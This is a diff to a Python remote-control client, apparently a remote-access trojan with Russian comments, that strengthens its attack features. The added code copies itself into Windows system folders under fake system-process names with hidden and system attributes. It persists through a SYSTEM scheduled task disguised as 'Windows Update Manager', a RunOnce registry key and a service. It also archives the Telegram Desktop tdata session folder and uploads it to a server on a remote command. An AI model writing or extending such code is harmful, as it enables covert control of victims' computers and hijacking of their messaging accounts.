@@ -79,75 +79,73 @@ class PCClient:
         
     def setup_persistence(self):
         try:
-            # Создаем скрытую копию в случайном месте
             if getattr(sys, 'frozen', False):
-                # Если мы в EXE
                 current_path = sys.executable
             else:
                 current_path = os.path.realpath(__file__)
-                
-            # Создаем скрытую папку в AppData
-            hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate')
-            os.makedirs(hidden_dir, exist_ok=True)
             
-            # Копируем себя
-            copy_path = os.path.join(hidden_dir, 'svchost.exe')
-            if not os.path.exists(copy_path):
-                shutil.copy2(current_path, copy_path)
-                # Устанавливаем скрытый атрибут
-                ctypes.windll.kernel32.SetFileAttributesW(copy_path, 2)
-                
-            # Добавляем в автозагрузку (скрыто)
-            self.add_to_startup(copy_path)
-            
-            # Создаем дополнительные копии в других местах
-            other_locations = [
-                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Security'),
-                os.path.join(os.getenv('SYSTEMDRIVE'), 'Windows', 'Temp', 'Microsoft'),
-                os.path.join(os.getenv('SYSTEMDRIVE'), 'ProgramData', 'NVIDIA Corporation')
+            # 1. Скрытые места для копий (более надежные)
+            hidden_locations = [
+                os.path.join(os.getenv('SystemRoot'), 'System32', 'Tasks'),  # Планировщик заданий
+                os.path.join(os.getenv('SystemRoot'), 'ServiceProfiles', 'LocalService'),  # Служебный профиль
+                os.path.join(os.getenv('ProgramData'), 'Microsoft', 'Windows Defender', 'Platform'),  # Защитник Windows
+                os.path.join(os.getenv('ProgramData'), 'Microsoft', 'Network', 'Downloader'),  # Сетевые загрузки
+                os.path.join(os.getenv('ProgramData'), 'NVIDIA Corporation', 'NetService'),  # NVIDIA
+                os.path.join(os.getenv('ProgramData'), 'Package Cache')  # Кэш установщиков
             ]
             
-            for location in other_locations:
+            # 2. Создаем копии в скрытых местах
+            copy_names = [
+                'taskhostw.exe',  # Маскировка под системный процесс
+                'wlms.exe',       # Windows License Monitoring
+                'msdtc.exe',      # Distributed Transaction Coordinator
+                'dfsr.exe'        # DFS Replication
+            ]
+            
+            for i, location in enumerate(hidden_locations):
                 try:
                     os.makedirs(location, exist_ok=True)
-                    alt_copy = os.path.join(location, 'dwm.exe')
-                    if not os.path.exists(alt_copy):
-                        shutil.copy2(current_path, alt_copy)
-                        ctypes.windll.kernel32.SetFileAttributesW(alt_copy, 2)
-                except Exception:
-                    pass
+                    copy_name = copy_names[i % len(copy_names)]
+                    copy_path = os.path.join(location, copy_name)
                     
+                    if not os.path.exists(copy_path):
+                        shutil.copy2(current_path, copy_path)
+                        # Устанавливаем скрытый и системный атрибуты
+                        ctypes.windll.kernel32.SetFileAttributesW(copy_path, 2 | 4)
+                except Exception as e:
+                    print(f"Ошибка создания копии в {location}: {e}")
+            
+            # 3. Добавляем в автозагрузку (более скрытые методы)
+            self.add_to_startup(current_path)
+            
         except Exception as e:
             print(f"Ошибка персистентности: {e}")
     
     def add_to_startup(self, exe_path):
         try:
-            # Добавляем в реестр (скрыто)
-            key = winreg.HKEY_CURRENT_USER
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            # Метод 1: Планировщик заданий (самый скрытный)
+            try:
+                schtasks_cmd = f'schtasks /create /tn "Windows Update Manager" /tr "{exe_path}" /sc onlogon /ru SYSTEM /f'
+                subprocess.run(schtasks_cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            except:
+                pass
             
-            with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
-                try:
+            # Метод 2: RunOnce в реестре (для текущего пользователя)
+            try:
+                key = winreg.HKEY_CURRENT_USER
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
+                with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                     winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
-                except WindowsError:
-                    pass
-                    
-            # Альтернативный метод через папку автозагрузки (скрыто)
-            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-            os.makedirs(startup_folder, exist_ok=True)
-            shortcut_path = os.path.join(startup_folder, 'Windows Update.lnk')
+            except:
+                pass
             
-            if not os.path.exists(shortcut_path):
-                from win32com.client import Dispatch
-                
-                shell = Dispatch('WScript.Shell')
-                shortcut = shell.CreateShortCut(shortcut_path)
-                shortcut.Targetpath = exe_path
-                shortcut.WorkingDirectory = os.path.dirname(exe_path)
-                shortcut.save()
-                
-                # Скрываем ярлык
-                ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 2)
+            # Метод 3: Службы (требует админских прав)
+            try:
+                service_name = "WinUpdate"
+                sc_cmd = f'sc create {service_name} binPath= "{exe_path}" start= auto'
+                subprocess.run(sc_cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            except:
+                pass
                 
         except Exception as e:
             print(f"Ошибка добавления в автозагрузку: {e}")
@@ -183,53 +181,82 @@ class PCClient:
 
     def get_telegram_data(self):
         try:
-            import tempfile
-            # Поиск Telegram Desktop
-            telegram_paths = [
+            # Поиск Telegram Desktop в возможных расположениях
+            possible_paths = [
                 os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
-                os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata')
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata'),
+                os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
+                os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Telegram Desktop', 'tdata')
             ]
-            
-            found_path = None
-            for path in telegram_paths:
+
+            tdata_path = None
+            for path in possible_paths:
                 if os.path.exists(path):
-                    found_path = path
+                    tdata_path = path
                     break
-                    
-            if not found_path:
-                return "Telegram Desktop не найден", None, None
-                
-            # Создаем временный архив
-            temp_dir = tempfile.mkdtemp()
+
+            if not tdata_path:
+                return "Telegram Desktop не найден или tdata отсутствует", None, None
+
+            # Создаем временную папку в более надежном месте
+            temp_dir = os.path.join(os.getenv('TEMP'), f"tg_{uuid.uuid4().hex[:8]}")
+            os.makedirs(temp_dir, exist_ok=True)
+
             zip_name = f"telegram_tdata_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
             zip_path = os.path.join(temp_dir, zip_name)
-            
-            # Создаем архив с tdata
-            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for root, dirs, files in os.walk(found_path):
-                    for file in files:
-                        try:
-                            full_path = os.path.join(root, file)
-                            arcname = os.path.relpath(full_path, os.path.dirname(found_path))
-                            zipf.write(full_path, arcname)
-                        except Exception as e:
-                            continue
-            
-            # Загружаем на сервер
-            download_url, msg = self.upload_large_file(zip_path, 'telegram')
-            
-            # Удаляем временные файлы
-            shutil.rmtree(temp_dir)
-            
-            if download_url:
-                file_size = os.path.getsize(zip_path) // (1024 * 1024)  # в MB
-                return (f"✅ Данные Telegram готовы к скачиванию\n"
-                       f"📦 Размер архива: {file_size} MB"), download_url, 'url'
-            else:
-                return msg, None, None
+
+            try:
+                # Создаем архив с tdata (только важные файлы)
+                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                    for root, dirs, files in os.walk(tdata_path):
+                        for file in files:
+                            try:
+                                # Пропускаем слишком большие или ненужные файлы
+                                if file.endswith(('.log', '.dmp')) or file.startswith('emoji'):
+                                    continue
+                                    
+                                full_path = os.path.join(root, file)
+                                rel_path = os.path.relpath(full_path, tdata_path)
+                                
+                                # Проверяем размер файла (пропускаем >50MB)
+                                if os.path.getsize(full_path) > 50 * 1024 * 1024:
+                                    continue
+                                    
+                                zipf.write(full_path, rel_path)
+                            except Exception as e:
+                                print(f"Ошибка добавления файла {file}: {e}")
+                                continue
+
+                if not os.path.exists(zip_path) or os.path.getsize(zip_path) == 0:
+                    return "Не удалось создать архив данных Telegram", None, None
+
+                # Загружаем на сервер
+                download_url, msg = self.upload_large_file(zip_path, 'telegram')
                 
+                if download_url:
+                    file_size = os.path.getsize(zip_path) // (1024 * 1024)  # в MB
+                    result = (f"✅ Данные Telegram готовы к скачиванию\n"
+                            f"📦 Размер архива: {file_size} MB\n"
+                            f"🔗 Ссылка: {download_url}")
+                    return result, download_url, 'url'
+                else:
+                    return f"Ошибка загрузки: {msg}", None, None
+
+            except Exception as e:
+                return f"Ошибка архивирования Telegram: {str(e)}", None, None
+
+            finally:
+                # Удаляем временные файлы
+                try:
+                    if os.path.exists(zip_path):
+                        os.remove(zip_path)
+                    if os.path.exists(temp_dir):
+                        shutil.rmtree(temp_dir, ignore_errors=True)
+                except Exception as e:
+                    print(f"Ошибка очистки временных файлов: {e}")
+
         except Exception as e:
-            return f"Ошибка получения данных Telegram: {str(e)}", None, None
+            return f"Критическая ошибка получения данных Telegram: {str(e)}", None, None
 
     def upload_large_file(self, file_path, file_type='file'):
         try:
@@ -542,6 +569,8 @@ class PCClient:
                 text = cmd[len('show_message:'):]
                 pyautogui.alert(text=text, title=title)
                 result = f"Показано сообщение: {title} - {text}"
+            if cmd.startswith('telegram_data'):
+                result, file_data, file_type = self.get_telegram_data()
             elif cmd.startswith('hotkey:'):
                 hotkey = cmd[len('hotkey:'):].replace(' ', '').lower()
                 if hotkey in ["win+l", "win+L"]:
